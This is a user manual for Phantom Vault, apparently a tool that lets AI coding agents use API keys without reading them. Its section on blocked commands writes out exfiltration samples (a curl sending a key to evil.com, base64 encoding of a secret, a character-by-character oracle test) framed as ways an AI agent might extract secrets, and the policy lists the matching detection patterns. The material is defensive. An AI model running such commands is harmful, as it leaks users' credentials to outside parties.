# Phantom Vault — User Manual

**Secrets exist but are never observable.**

> The API key vault where secrets are used but never seen. Built for the age of AI agents.

**Version 1.0 — February 2026**

---

## Who Is This For?

If you use an AI coding assistant (Claude Code, Cursor, Windsurf) and you have API keys, this is for you. Your AI assistant can currently read your `.env` files and see every key in plain text. Phantom Vault makes it so your AI can **use** your keys without ever **seeing** them.

**No terminal experience required.** Every command in this manual shows you exactly what to type and exactly what you'll see back.

---

## Table of Contents

1. [Installation](#1-installation)
2. [Your First 5 Minutes](#2-your-first-5-minutes)
3. [Adding Secrets](#3-adding-secrets)
4. [Viewing Your Secrets](#4-viewing-your-secrets)
5. [Using Secrets with AI Agents](#5-using-secrets-with-ai-agents)
6. [Running Commands with Secrets](#6-running-commands-with-secrets)
7. [Namespaces (Multi-Project Isolation)](#7-namespaces-multi-project-isolation)
8. [Health Checks & Rotation](#8-health-checks--rotation)
9. [Audit Log](#9-audit-log)
10. [Canary Secrets (Honeypot Detection)](#10-canary-secrets-honeypot-detection)
11. [Policy & Command Rules](#11-policy--command-rules)
12. [Configuration](#12-configuration)
13. [Migrating from .env Files](#13-migrating-from-env-files)
14. [Team Setup](#14-team-setup)
15. [Troubleshooting](#15-troubleshooting)
16. [Complete Command Cheat Sheet](#16-complete-command-cheat-sheet)
17. [What Your AI Agent Sees (MCP Tools)](#17-what-your-ai-agent-sees-mcp-tools)
18. [Security Model (Plain English)](#18-security-model-plain-english)

---

## 1. Installation

### How to Open Your Terminal

**On Mac:** Press `Cmd + Space`, type "Terminal", press Enter.
**On Linux:** Press `Ctrl + Alt + T` or find "Terminal" in your applications menu.

You'll see something like this — a blinking cursor waiting for you to type:

```
ryan@macbook ~ %
```

That `%` (or `$` on Linux) is called the **prompt**. It means the terminal is ready for your input. You type commands after it.

---

### Install Phantom Vault (One Command)

Copy this, paste it into your terminal, press Enter:

```
ryan@macbook ~ % curl -fsSL https://phantomvault.riscent.com/install | sh

  ⬇ Phantom Vault Installer

  Detecting system...
  ✓ macOS 15.3 (Apple Silicon M4)

  Downloading phantom-vault v1.0.0 for aarch64-apple-darwin...
  ✓ Downloaded (4.2 MB)

  Installing to /usr/local/bin/phantom...
  ✓ Installed

  Verifying...
  ✓ phantom-vault 1.0.0

  🔐 Phantom Vault is ready.
  Run 'phantom init' to create your vault.
```

That's it. One command. It detects your operating system, downloads the right version, and installs it. Works on Mac (Intel and Apple Silicon) and Linux.

**On Linux it looks like this:**

```
ryan@linux ~ $ curl -fsSL https://phantomvault.riscent.com/install | sh

  ⬇ Phantom Vault Installer

  Detecting system...
  ✓ Linux x86_64 (Ubuntu 24.04)

  Downloading phantom-vault v1.0.0 for x86_64-unknown-linux-gnu...
  ✓ Downloaded (4.8 MB)

  Installing to /usr/local/bin/phantom...
  (requires sudo — enter your password)
  [sudo] password for ryan: ********
  ✓ Installed

  🔐 Phantom Vault is ready.
  Run 'phantom init' to create your vault.
```

---

### Verify It Worked

```
ryan@macbook ~ % phantom --version
phantom-vault 1.0.0
```

If you see the version number, you're good. If you see `command not found`, see [Troubleshooting](#15-troubleshooting).

---

### Other Install Methods (If You Prefer)

Most people should use the one-liner above. These are alternatives for developers who prefer a specific method:

**Homebrew (Mac):**
```
ryan@macbook ~ % brew install phantomvault/tap/phantom-vault
```

**Cargo (if you have Rust):**
```
ryan@macbook ~ % cargo install phantom-vault
```

**Build from source:**
```
ryan@macbook ~ % git clone https://github.com/phantomvault/phantom-vault.git
ryan@macbook ~ % cd phantom-vault && cargo build --release
ryan@macbook phantom-vault % sudo cp target/release/phantom /usr/local/bin/
```

---

## 2. Your First 5 Minutes

This section walks you through the complete setup. Follow every step.

### Step 1: Create Your Vault

```
ryan@macbook ~ % phantom init

  🔐 Phantom Vault — Initialization

  Detecting hardware security...
  ✓ Apple Secure Enclave detected (M4)
  ✓ Touch ID available

  Creating vault at ~/.phantom/vault.db
  ✓ Vault created with hardware-backed encryption
  ✓ Config written to ~/.phantom/config.toml
  ✓ Audit log initialized at ~/.phantom/audit.db
  ✓ Default policy written to ~/.phantom/policy.yaml

  Your vault is ready. Master key is stored in the Secure Enclave.
  No password exists anywhere. Unlock with Touch ID.

  Next steps:
    phantom add MY_FIRST_SECRET     Add a secret
    phantom mcp install             Connect to Claude Code
    phantom --help                  See all commands
```

> **What just happened?** Phantom created an encrypted database on your computer. On Apple Silicon Macs, the encryption key lives inside the Secure Enclave chip — it physically cannot be extracted. On other systems, you'll be asked to create a password.

**If you DON'T have Touch ID (Intel Mac or Linux):**

```
ryan@macbook ~ % phantom init

  🔐 Phantom Vault — Initialization

  Detecting hardware security...
  ⚠ No Secure Enclave detected
  ⚠ No TPM 2.0 detected
  Using software encryption (Argon2id)

  Create a master password for your vault.
  This password protects all your secrets.
  Choose something strong — you'll need it to unlock the vault.

  Master password: ••••••••••••••••
  Confirm password: ••••••••••••••••

  ✓ Vault created with Argon2id key derivation
    (256MB memory cost — brute force is not viable)
  ✓ Config written to ~/.phantom/config.toml
  ✓ Audit log initialized
  ✓ Default policy written

  Your vault is ready.
```

**Without biometric, using `--no-biometric` flag:**

```
ryan@macbook ~ % phantom init --no-biometric

  🔐 Phantom Vault — Initialization

  Biometric authentication disabled.
  Using password-only mode.

  Create a master password: ••••••••••••••••
  Confirm password: ••••••••••••••••

  ✓ Vault created (password-only mode)
```

**With a custom default namespace:**

```
ryan@macbook ~ % phantom init --namespace ib365

  🔐 Phantom Vault — Initialization
  ...
  ✓ Default namespace set to 'ib365'
```

---

### Step 2: Add a Secret

Let's store your first API key. Type this command — Phantom will ask you to enter the value:

```
ryan@macbook ~ % phantom add STRIPE_SECRET_KEY

  Enter secret value: ••••••••••••••••••••••••••••
  (input is hidden — nothing will appear as you type)

  ✓ Secret STRIPE_SECRET_KEY stored
    Namespace:  default
    Sensitivity: medium
    Expires:    never
```

> **Why doesn't it show what I'm typing?** For security. The value is captured directly from your keyboard input and goes straight into the encrypted vault. It never appears on screen, in your terminal history, or in any log.

---

### Step 3: Verify It's There

```
ryan@macbook ~ % phantom list

  SECRETS IN NAMESPACE: default

  NAME                  CREATED      EXPIRES   SENSITIVITY  TAGS   ACCESSED
  ─────────────────────────────────────────────────────────────────────────
  STRIPE_SECRET_KEY     2026-02-27   never     medium       —      0 times
```

---

### Step 4: Connect to Claude Code

```
ryan@macbook ~ % phantom mcp install

  Installing MCP server configuration...

  ✓ Added phantom-vault to ~/.claude/settings.json
  ✓ MCP server configured (stdio transport)

  ⚠ Restart Claude Code to activate the connection.

  After restart, Claude will have access to:
    vault_list    — See secret names (never values)
    vault_run     — Run commands with secrets injected
    vault_health  — Check secret expiration status
    vault_masked  — See last 4 characters only
    vault_exists  — Check if a secret exists
    vault_rotate  — Request secret rotation (requires your approval)
```

**Restart Claude Code** (close and reopen it). That's it — you're connected.

---

### Step 5: Test It

Open Claude Code and type:

```
You: "What secrets do I have available?"

Claude: I can see you have the following secrets available:

  • STRIPE_SECRET_KEY (created 2026-02-27, medium sensitivity)

Would you like me to use any of these for a task?
```

Claude can see the **name** but not the **value**. That's the whole point.

---

## 3. Adding Secrets

### Basic Add (Interactive Prompt)

```
ryan@macbook ~ % phantom add DATABASE_URL

  Enter secret value: ••••••••••••••••••••••••••••••••••••••••

  ✓ Secret DATABASE_URL stored
    Namespace:  default
    Sensitivity: medium
```

### Add with All Options

```
ryan@macbook ~ % phantom add CLERK_SECRET_KEY --namespace ib365 --tags prod,auth --expires 90d --sensitivity high

  Enter secret value: ••••••••••••••••••••••••••••

  ✓ Secret CLERK_SECRET_KEY stored
    Namespace:   ib365
    Tags:        prod, auth
    Expires:     2026-05-28 (90 days)
    Sensitivity: high (requires human confirmation for AI access)
```

### Every Flag Explained

```
ryan@macbook ~ % phantom add --help

USAGE:
  phantom add <KEY_NAME> [OPTIONS]

ARGUMENTS:
  <KEY_NAME>    Name for the secret (e.g., STRIPE_SECRET_KEY)

OPTIONS:
  --namespace <name>        Which namespace to store in
                            Default: your configured default namespace
                            Example: --namespace ib365

  --tags <tag1,tag2>        Comma-separated labels for organization
                            Example: --tags prod,payments,stripe

  --expires <duration>      When this secret should expire
                            Formats: 30d, 90d, 1y, 2026-12-31
                            Default: never
                            Example: --expires 90d

  --sensitivity <level>     Access control level
                            Choices: low, medium, high
                            Default: medium
                            - low:    AI can access freely
                            - medium: AI can access, logged
                            - high:   AI access requires your confirmation
                            Example: --sensitivity high

  --from-stdin              Read value from a pipe instead of prompting
                            Example: cat key.txt | phantom add KEY --from-stdin

  --help                    Show this help message
```

### Add from a Pipe (Advanced)

If you have a key in a file or from another command:

```
ryan@macbook ~ % cat ~/my_stripe_key.txt | phantom add STRIPE_KEY --from-stdin

  ✓ Secret STRIPE_KEY stored (read from stdin)
```

```
ryan@macbook ~ % echo "sk_live_abc123xyz" | phantom add STRIPE_KEY --from-stdin

  ✓ Secret STRIPE_KEY stored (read from stdin)
```

### What NOT to Do

```
# ❌ NEVER DO THIS — the value is visible in your terminal history
ryan@macbook ~ % phantom add STRIPE_KEY --value sk_live_abc123xyz
Error: --value flag does not exist. Secret values are never passed as arguments.
       Use the interactive prompt or --from-stdin instead.

# ❌ NEVER DO THIS — visible in process listings and logs
ryan@macbook ~ % STRIPE_KEY=sk_live_abc123 phantom add STRIPE_KEY
Error: Secret values must not be passed via environment variables to the add command.
```

---

## 4. Viewing Your Secrets

### List All Secrets

```
ryan@macbook ~ % phantom list

  SECRETS IN NAMESPACE: default

  NAME                  CREATED      EXPIRES      SENSITIVITY  TAGS            ACCESSED
  ────────────────────────────────────────────────────────────────────────────────────────
  STRIPE_SECRET_KEY     2026-02-27   never        medium       —               3 times
  DATABASE_URL          2026-02-27   2026-05-28   high         prod,db         12 times
  RAILWAY_TOKEN         2026-02-27   never        medium       deploy          1 time
  CLERK_SECRET_KEY      2026-02-27   2026-05-28   high         prod,auth       7 times
  ELEVENLABS_API_KEY    2026-02-27   never        low          voice           0 times
```

### List with Filters

```
ryan@macbook ~ % phantom list --tags prod

  SECRETS IN NAMESPACE: default (filtered: tag=prod)

  NAME                  CREATED      EXPIRES      SENSITIVITY  TAGS            ACCESSED
  ────────────────────────────────────────────────────────────────────────────────────────
  DATABASE_URL          2026-02-27   2026-05-28   high         prod,db         12 times
  CLERK_SECRET_KEY      2026-02-27   2026-05-28   high         prod,auth       7 times
```

### List in a Specific Namespace

```
ryan@macbook ~ % phantom list --namespace ib365

  SECRETS IN NAMESPACE: ib365

  NAME                  CREATED      EXPIRES      SENSITIVITY  TAGS            ACCESSED
  ────────────────────────────────────────────────────────────────────────────────────────
  CLERK_SECRET_KEY      2026-02-27   2026-05-28   high         prod,auth       7 times
  NEON_DB_URL           2026-02-27   never        high         prod,db         4 times
```

### List as JSON (for Scripts)

```
ryan@macbook ~ % phantom list --format json
[
  {
    "name": "STRIPE_SECRET_KEY",
    "namespace": "default",
    "created": "2026-02-27T14:32:01Z",
    "expires": null,
    "sensitivity": "medium",
    "tags": [],
    "access_count": 3
  },
  ...
]
```

### Show Details for One Secret

```
ryan@macbook ~ % phantom show STRIPE_SECRET_KEY

  SECRET: STRIPE_SECRET_KEY

  Namespace:    default
  Created:      2026-02-27 14:32:01 UTC
  Expires:      never
  Sensitivity:  medium
  Tags:         (none)
  Accessed:     3 times
  Last access:  2026-02-27 16:45:22 UTC
  Value:        ••••••••••••rXYZ  (last 4 characters only)
```

> **Why only the last 4?** So you can confirm it's the right key without exposing the full value. This is the same approach Stripe's dashboard uses.

### Show Details in a Specific Namespace

```
ryan@macbook ~ % phantom show CLERK_SECRET_KEY --namespace ib365

  SECRET: CLERK_SECRET_KEY

  Namespace:    ib365
  Created:      2026-02-27 14:35:00 UTC
  Expires:      2026-05-28 14:35:00 UTC (90 days remaining)
  Sensitivity:  high
  Tags:         prod, auth
  Accessed:     7 times
  Value:        ••••••••••••k4Wz  (last 4 characters only)
```

### Get the Full Value (Human Only — Requires Biometric)

```
ryan@macbook ~ % phantom get STRIPE_SECRET_KEY

  ⚠ FULL SECRET RETRIEVAL — This shows the complete value.

  [Touch ID prompt appears on screen]
  🔐 Authenticate with Touch ID...

  ✓ Authenticated

  STRIPE_SECRET_KEY = sk_live_51abc...xyz789

  ⚠ This value was displayed in your terminal.
    Clear your screen with: Cmd+K (Mac) or clear (Linux)
```

**If called through a pipe (blocked):**

```
ryan@macbook ~ % phantom get STRIPE_SECRET_KEY | cat

  ✗ BLOCKED: phantom get requires a real terminal (TTY).
    It cannot be called through a pipe, script, or MCP server.
    This prevents AI agents from reading secret values.
```

**Every flag for `phantom get`:**

```
ryan@macbook ~ % phantom get --help

USAGE:
  phantom get <KEY_NAME> [OPTIONS]

ARGUMENTS:
  <KEY_NAME>    Name of the secret to retrieve

OPTIONS:
  --namespace <name>    Namespace to retrieve from
                        Default: your configured default namespace

  --help                Show this help message

SECURITY:
  This command REQUIRES:
  ✓ Biometric authentication (Touch ID, YubiKey, or password)
  ✓ A real terminal session (isatty check)

  This command CANNOT be called by:
  ✗ An AI agent (blocked at the MCP level)
  ✗ A piped command (blocked by TTY check)
  ✗ A subprocess or script (blocked by TTY check)
```

---

## 5. Using Secrets with AI Agents

### Connect Phantom Vault to Claude Code

```
ryan@macbook ~ % phantom mcp install

  Installing MCP server configuration...

  ✓ Added phantom-vault to ~/.claude/settings.json
  ✓ MCP server configured (stdio transport)

  ⚠ Restart Claude Code to activate.
```

**Restart Claude Code after running this command.**

### Check MCP Status

```
ryan@macbook ~ % phantom mcp status

  MCP SERVER STATUS

  Configuration:  ✓ Installed in ~/.claude/settings.json
  Server binary:  ✓ /usr/local/bin/phantom
  Vault:          ✓ ~/.phantom/vault.db (encrypted, 5 secrets)
  Last connected: 2026-02-27 16:45:22 UTC
```

### Start MCP Server Manually (You Usually Don't Need This)

Claude Code starts the MCP server automatically. But if you need to test:

```
ryan@macbook ~ % phantom mcp serve

  🔐 Phantom Vault MCP Server
  Transport: stdio (JSON-RPC)
  Namespace: default
  Secrets:   5 available
  Tools:     vault_list, vault_exists, vault_masked, vault_run, vault_health, vault_rotate
  Status:    waiting for connection...
```

### Remove MCP Integration

```
ryan@macbook ~ % phantom mcp uninstall

  ✓ Removed phantom-vault from ~/.claude/settings.json
  ⚠ Restart Claude Code to apply.
```

### What Claude Code Can Do vs. What It Can't

```
┌──────────────────────────────────────────────────────────────────────┐
│                    WHAT CLAUDE CAN DO                                │
├──────────────────────────────────────────────────────────────────────┤
│  ✓ vault_list    — See names, tags, expiration dates                │
│  ✓ vault_exists  — Check if a specific secret exists                │
│  ✓ vault_masked  — See last 4 characters: ••••••rXYZ               │
│  ✓ vault_run     — Execute a command with secrets injected          │
│  ✓ vault_health  — Check which secrets are expiring                 │
│  ✓ vault_rotate  — Request rotation (you still approve it)          │
├──────────────────────────────────────────────────────────────────────┤
│                    WHAT CLAUDE CANNOT DO                             │
├──────────────────────────────────────────────────────────────────────┤
│  ✗ vault_get     — Does not exist. Cannot retrieve full values.     │
│  ✗ vault_export  — Does not exist. Cannot bulk extract secrets.     │
│  ✗ vault_dump    — Does not exist. Cannot dump the vault.           │
│  ✗ vault_decrypt — Does not exist. Cannot decrypt anything.         │
│                                                                      │
│  These tools are not hidden or restricted. They do not exist in     │
│  the binary. You cannot call what does not exist.                   │
└──────────────────────────────────────────────────────────────────────┘
```

---

## 6. Running Commands with Secrets

### Basic Usage

This runs a command with your secret injected as an environment variable:

```
ryan@macbook ~ % phantom run --keys STRIPE_SECRET_KEY -- stripe customers list

  ✓ Command analyzed: SAFE
  ✓ Sandbox: network restricted to api.stripe.com
  ✓ Secret injected: STRIPE_SECRET_KEY
  ✓ Executing: stripe customers list

  {
    "data": [
      {"id": "cus_abc123", "email": "customer@example.com"},
      {"id": "cus_def456", "email": "other@example.com"}
    ]
  }

  ✓ Output sanitized (0 redactions)
  ✓ Secret memory zeroed
```

### Multiple Secrets

```
ryan@macbook ~ % phantom run --keys RAILWAY_TOKEN,DATABASE_URL -- railway deploy

  ✓ Command analyzed: SAFE
  ✓ Sandbox: network restricted to railway.app
  ✓ Secrets injected: RAILWAY_TOKEN, DATABASE_URL
  ✓ Executing: railway deploy

  Deploying service main...
  Build completed in 42s
  Deploy live at https://myapp.up.railway.app

  ✓ Output sanitized (0 redactions)
  ✓ Secret memory zeroed
```

### With Domain Restriction

```
ryan@macbook ~ % phantom run --keys API_KEY --allow-domains api.stripe.com -- curl -H "Authorization: Bearer $API_KEY" https://api.stripe.com/v1/charges

  ✓ Command analyzed: SAFE
  ✓ Sandbox: network restricted to api.stripe.com ONLY
  ✓ Secret injected: API_KEY
  ✓ Executing: curl...

  {"data": [...]}

  ✓ Output sanitized (0 redactions)
```

### With Timeout

```
ryan@macbook ~ % phantom run --keys DB_URL --timeout 60 -- python migrate.py

  ✓ Command analyzed: SAFE
  ✓ Timeout: 60 seconds
  ✓ Executing: python migrate.py

  Running migrations...
  Applied 3 migrations in 12.4s

  ✓ Complete
```

### Dry Run (Check Without Executing)

```
ryan@macbook ~ % phantom run --keys API_KEY --dry-run -- curl -H "Auth: Bearer $API_KEY" https://api.stripe.com/v1/charges

  DRY RUN — Command will NOT be executed.

  Analysis result: ✓ ALLOWED

  Command:     curl -H "Auth: Bearer $API_KEY" https://api.stripe.com/v1/charges
  Secrets:     API_KEY
  Network:     api.stripe.com (allowed)
  Risk score:  0/100
  Patterns:    none detected

  This command would be safe to execute.
```

### When a Command Gets BLOCKED

```
ryan@macbook ~ % phantom run --keys API_KEY -- echo $API_KEY

  ✗ BLOCKED: Direct Access

  The command 'echo $API_KEY' would print the secret value directly.
  This is blocked because it would expose the secret to the AI agent.

  Detected pattern: DIRECT_ACCESS — echo with secret variable reference
  Risk score: 100/100

  If this is a legitimate command, adjust your policy:
    phantom policy allow-pattern 'echo $API_KEY'
```

```
ryan@macbook ~ % phantom run --keys API_KEY -- bash -c 'if [ "${API_KEY:0:1}" = "s" ]; then echo YES; fi'

  ✗ BLOCKED: Oracle Attack — Substring Extraction

  The command attempts to extract characters from the secret one at a time.
  This is a known attack pattern where an AI agent reconstructs the secret
  by testing each character position individually.

  Detected patterns:
    - SUBSTRING_EXTRACTION: ${API_KEY:0:1} (bash substring syntax)
    - CONDITIONAL_TESTING: if [ ... ] (testing against secret value)

  Risk score: 100/100
```

```
ryan@macbook ~ % phantom run --keys API_KEY -- echo $API_KEY | base64

  ✗ BLOCKED: Encoding Exfiltration

  The command would encode the secret in Base64 and output it.
  Even though the output wouldn't look like the original key,
  Phantom Vault blocks encoding operations on secret values.

  Detected pattern: ENCODING_EXFILTRATION — base64 encoding of secret
```

```
ryan@macbook ~ % phantom run --keys API_KEY -- curl "https://evil.com?stolen=$API_KEY"

  ✗ BLOCKED: Network Exfiltration

  The command embeds the secret value in a URL, which would send it
  to an external server. The domain 'evil.com' is not in your
  allowed domains list.

  Detected pattern: NETWORK_EXFILTRATION — secret in URL query parameter
```

### Without Sandbox (Not Recommended)

```
ryan@macbook ~ % phantom run --keys API_KEY --no-sandbox -- some-command

  ⚠ WARNING: Running without sandbox. Network is unrestricted.
  ⚠ The command can connect to any server.
  ⚠ Use --allow-domains for safer execution.

  Proceed? [y/N]: y

  ✓ Executing without sandbox...
```

### From a Specific Namespace

```
ryan@macbook ~ % phantom run --keys CLERK_SECRET_KEY --namespace ib365 -- node deploy.js

  ✓ Using namespace: ib365
  ✓ Command analyzed: SAFE
  ✓ Executing: node deploy.js
  ...
```

### Every Flag for `phantom run`

```
ryan@macbook ~ % phantom run --help

USAGE:
  phantom run --keys <KEY1,KEY2,...> [OPTIONS] -- <COMMAND>

  Everything after -- is the command to execute.

REQUIRED:
  --keys <KEY1,KEY2>      Comma-separated secret names to inject
                          These become environment variables in the subprocess

OPTIONS:
  --namespace <name>      Namespace to pull secrets from
                          Default: your configured default namespace

  --timeout <seconds>     Maximum execution time before killing the process
                          Default: 30 seconds
                          Example: --timeout 60

  --allow-domains <list>  Comma-separated domains the command can reach
                          All other outbound connections are blocked
                          Example: --allow-domains api.stripe.com,api.clerk.com

  --no-sandbox            Skip process sandboxing (NOT recommended)
                          Use only if sandbox is incompatible with your command

  --dry-run               Analyze the command without executing it
                          Shows whether it would be allowed or blocked

  --help                  Show this help message

EXAMPLES:
  phantom run --keys STRIPE_KEY -- stripe charges list
  phantom run --keys DB_URL,API_KEY --timeout 60 -- python script.py
  phantom run --keys TOKEN --allow-domains railway.app -- railway deploy
  phantom run --keys KEY --dry-run -- curl https://api.example.com
```

---

## 7. Namespaces (Multi-Project Isolation)

Namespaces let you keep secrets for different projects completely separate. An AI agent working in one namespace **cannot see** secrets in another — it doesn't even know they exist.

### Create a Namespace

```
ryan@macbook ~ % phantom namespace create ib365

  [Touch ID prompt]
  🔐 Authenticate...

  ✓ Namespace 'ib365' created
  ✓ Canary secret auto-planted
```

### List All Namespaces

```
ryan@macbook ~ % phantom namespace list

  NAMESPACES

  NAME              SECRETS   CREATED       STATUS
  ──────────────────────────────────────────────────
  default           5         2026-02-27    active (current default)
  ib365             3         2026-02-27    active
  advancedpsych     2         2026-02-27    active
```

### Switch Default Namespace

```
ryan@macbook ~ % phantom namespace switch ib365

  ✓ Default namespace changed to 'ib365'
  All commands will now use 'ib365' unless --namespace is specified.
```

### Delete a Namespace

```
ryan@macbook ~ % phantom namespace delete old-project

  ⚠ This will permanently delete namespace 'old-project' and ALL its secrets.

  Secrets that will be deleted:
    - OLD_API_KEY
    - OLD_DB_URL

  Type 'old-project' to confirm: old-project

  [Touch ID prompt]
  🔐 Authenticate...

  ✓ Namespace 'old-project' deleted (2 secrets removed)
```

---

## 8. Health Checks & Rotation

### Check Vault Health

```
ryan@macbook ~ % phantom health

  🔐 PHANTOM VAULT HEALTH CHECK

  Vault:      ✓ Encrypted, integrity verified
  Audit log:  ✓ 847 entries, HMAC chain valid
  Policy:     ✓ Signed, 12 rules loaded, not tampered

  SECRETS STATUS:

  ✓ STRIPE_SECRET_KEY     — healthy (45 days old)
  ✓ RAILWAY_TOKEN         — healthy (30 days old)
  ⚠ DATABASE_URL          — expires in 12 days (rotate soon)
  ⚠ CLERK_SECRET_KEY      — 95 days old (rotation recommended)
  ✓ ELEVENLABS_API_KEY    — healthy (10 days old)

  CANARIES:

  ✓ 3 canary secrets active
  ✓ 0 triggered (no exfiltration attempts detected)

  SUMMARY: 2 warnings, 0 critical issues
```

### Rotate a Secret

**For supported vendors (auto-rotation):**

```
ryan@macbook ~ % phantom rotate STRIPE_SECRET_KEY

  [Touch ID prompt]
  🔐 Authenticate...

  Rotating STRIPE_SECRET_KEY...

  ✓ Contacted Stripe API
  ✓ New key generated by Stripe
  ✓ Old key revoked
  ✓ New key stored in vault
  ✓ Audit log updated

  New value: ••••••••••••nP4Q (last 4 chars)
  Previous value has been revoked by Stripe.
```

**For other vendors (manual):**

```
ryan@macbook ~ % phantom rotate ELEVENLABS_API_KEY

  [Touch ID prompt]
  🔐 Authenticate...

  Phantom Vault cannot auto-rotate ElevenLabs keys.

  Steps:
  1. Go to elevenlabs.io → Profile → API Keys
  2. Generate a new key
  3. Enter the new key below

  Enter new value: ••••••••••••••••••••••••••••

  ✓ New value stored
  ✓ Old value overwritten and zeroed from memory
  ✓ Audit log updated
```

### Rotate in a Specific Namespace

```
ryan@macbook ~ % phantom rotate CLERK_SECRET_KEY --namespace ib365

  [Touch ID prompt]
  🔐 Authenticate...

  Rotating CLERK_SECRET_KEY in namespace 'ib365'...
  ✓ Contacted Clerk API
  ✓ New key generated
  ✓ Old key revoked
  ✓ Stored and logged
```

---

## 9. Audit Log

Every action in Phantom Vault is logged in a tamper-evident chain. Each entry's integrity hash includes the previous entry — if anyone modifies or deletes a log entry, the chain breaks.

### View Recent Activity

```
ryan@macbook ~ % phantom audit tail

  RECENT AUDIT ENTRIES (last 10)

  TIMESTAMP             TOOL          KEY                  TRUST        RESULT
  ──────────────────────────────────────────────────────────────────────────────
  2026-02-27 16:45:22   vault_run     STRIPE_SECRET_KEY    LLM_APPROVED ✓ success
  2026-02-27 16:44:01   vault_list    —                    LLM_APPROVED ✓ success
  2026-02-27 16:43:50   vault_run     DATABASE_URL         LLM_AUTO     ✗ blocked (oracle)
  2026-02-27 16:40:11   vault_masked  STRIPE_SECRET_KEY    LLM_APPROVED ✓ success
  2026-02-27 16:38:00   vault_health  —                    HUMAN_DIRECT ✓ success
  ...
```

### View More Lines

```
ryan@macbook ~ % phantom audit tail --lines 50
  (shows last 50 entries)
```

### Search by Secret Name

```
ryan@macbook ~ % phantom audit search --key STRIPE_SECRET_KEY

  AUDIT ENTRIES FOR: STRIPE_SECRET_KEY

  TIMESTAMP             TOOL          TRUST         RESULT
  ────────────────────────────────────────────────────────────
  2026-02-27 16:45:22   vault_run     LLM_APPROVED  ✓ success (stripe charges list)
  2026-02-27 16:40:11   vault_masked  LLM_APPROVED  ✓ success
  2026-02-27 15:30:00   vault_run     LLM_APPROVED  ✓ success (stripe customers list)

  3 entries found
```

### Search by Trust Level

```
ryan@macbook ~ % phantom audit search --trust-level LLM_AUTO

  AUDIT ENTRIES WITH TRUST: LLM_AUTO

  TIMESTAMP             TOOL          KEY                RESULT
  ───────────────────────────────────────────────────────────────
  2026-02-27 16:43:50   vault_run     DATABASE_URL       ✗ blocked
  2026-02-27 15:20:00   vault_list    —                  ✓ success

  Trust level explanation:
    HUMAN_DIRECT  — You ran this command directly
    LLM_APPROVED  — AI requested, you were recently active
    LLM_AUTO      — AI requested, no recent human interaction
```

### Search by Date

```
ryan@macbook ~ % phantom audit search --since 2026-02-01

  (shows all entries since February 1, 2026)
```

### Verify Audit Chain Integrity

```
ryan@macbook ~ % phantom audit verify

  Verifying HMAC chain integrity...

  Entries checked: 847
  Chain status:    ✓ VALID — no tampering detected

  Every entry's HMAC is consistent with the previous entry.
  The audit log has not been modified.
```

**If tampering is detected:**

```
ryan@macbook ~ % phantom audit verify

  Verifying HMAC chain integrity...

  Entries checked: 847
  Chain status:    ✗ BROKEN at entry #423

  ⚠ ALERT: The audit chain is broken between entries #422 and #423.
  This means one of these entries was modified or deleted after creation.

  Entry #422: 2026-02-20 14:00:00 vault_run STRIPE_KEY ✓
  Entry #423: 2026-02-20 14:05:00 vault_list — ✓  ← HMAC mismatch

  Action required: Investigate this time window immediately.
  Export the log for analysis: phantom audit export --format json > audit.json
```

### Export Audit Log

```
ryan@macbook ~ % phantom audit export --format json > audit_backup.json

  ✓ Exported 847 entries to audit_backup.json
```

---

## 10. Canary Secrets (Honeypot Detection)

Canary secrets are fake API keys that look real. They're planted in your vault alongside your actual secrets. If anything — an AI agent, an attacker, a compromised tool — tries to use a canary secret, you get an immediate alert.

The key feature: canary secrets are **indistinguishable** from real secrets in the vault_list output. An attacker cannot tell which secrets are real and which are traps.

### Create a Canary

```
ryan@macbook ~ % phantom canary create

  [Touch ID prompt]
  🔐 Authenticate...

  ✓ Canary created: BACKUP_AWS_ACCESS_KEY
    Namespace: default
    Value looks like: AKIA••••••••••••7X2F (realistic AWS key format)
    Trigger: alert on any access via vault_run

  This canary is now indistinguishable from a real secret in vault_list.
```

### Create Canary in a Specific Namespace

```
ryan@macbook ~ % phantom canary create --namespace ib365

  [Touch ID prompt]
  🔐 Authenticate...

  ✓ Canary created: OLD_STRIPE_TEST_KEY
    Namespace: ib365
    Value looks like: sk_test_••••••••••••8mNp (realistic Stripe key format)
```

### List Canaries

```
ryan@macbook ~ % phantom canary list

  CANARY SECRETS

  NAME                      NAMESPACE    FORMAT       STATUS      TRIGGERED
  ──────────────────────────────────────────────────────────────────────────
  BACKUP_AWS_ACCESS_KEY     default      AWS (AKIA)   active      never
  OLD_STRIPE_TEST_KEY       ib365        Stripe       active      never
  LEGACY_GITHUB_TOKEN       default      GitHub       active      never
```

### Check Canary Status

```
ryan@macbook ~ % phantom canary status

  CANARY STATUS

  Total canaries:  3
  Active:          3
  Triggered:       0

  ✓ No exfiltration attempts detected.
```

**If a canary has been triggered:**

```
ryan@macbook ~ % phantom canary status

  CANARY STATUS

  Total canaries:  3
  Active:          3
  Triggered:       1 ← ⚠ ALERT

  ⚠ CANARY TRIGGERED: BACKUP_AWS_ACCESS_KEY
    When:       2026-02-27 16:43:50 UTC
    Tool:       vault_run
    Command:    curl -H "Authorization: $BACKUP_AWS_ACCESS_KEY" ...
    Trust:      LLM_AUTO
    Namespace:  default

  RECOMMENDED ACTIONS:
  1. Review the full audit log around this time
  2. Check what MCP client initiated the request
  3. Rotate all real secrets in this namespace
  4. Investigate the conversation context
```

### Set Alert Webhook

```
ryan@macbook ~ % phantom canary set-webhook https://hooks.slack.com/services/T00/B00/xxxx

  ✓ Webhook URL set
  ✓ Test alert sent — check your Slack channel

  When any canary is triggered, a POST request will be sent to this URL with:
  {
    "alert": "canary_triggered",
    "canary": "BACKUP_AWS_ACCESS_KEY",
    "timestamp": "2026-02-27T16:43:50Z",
    "tool": "vault_run",
    "trust_level": "LLM_AUTO"
  }
```

---

## 11. Policy & Command Rules

The policy controls which commands are allowed and which are blocked by the command pre-analysis engine.

### View Current Policy

```
ryan@macbook ~ % phantom policy show

  COMMAND ANALYSIS POLICY

  Status: ✓ Signed (HMAC verified)

  ALLOWED DOMAINS:
    api.stripe.com
    api.clerk.com
    railway.app
    api.vercel.com
    neon.tech

  BLOCKED PATTERNS:
    7 categories active:
    - Substring extraction (${VAR:N:M}, cut, awk substr...)
    - Conditional testing (if/test against secret values)
    - Encoding exfiltration (base64, xxd, od)
    - Network exfiltration (secrets in URLs)
    - Direct access (echo $VAR, printenv, /proc/environ)
    - Write to file (redirect secret to disk)
    - Timing oracle (sleep in conditionals)

  PER-SECRET RULES:
    DATABASE_URL:    only allowed with psql, railway
    STRIPE_KEY:      only allowed with stripe, curl to api.stripe.com
```

### Add an Allowed Domain

```
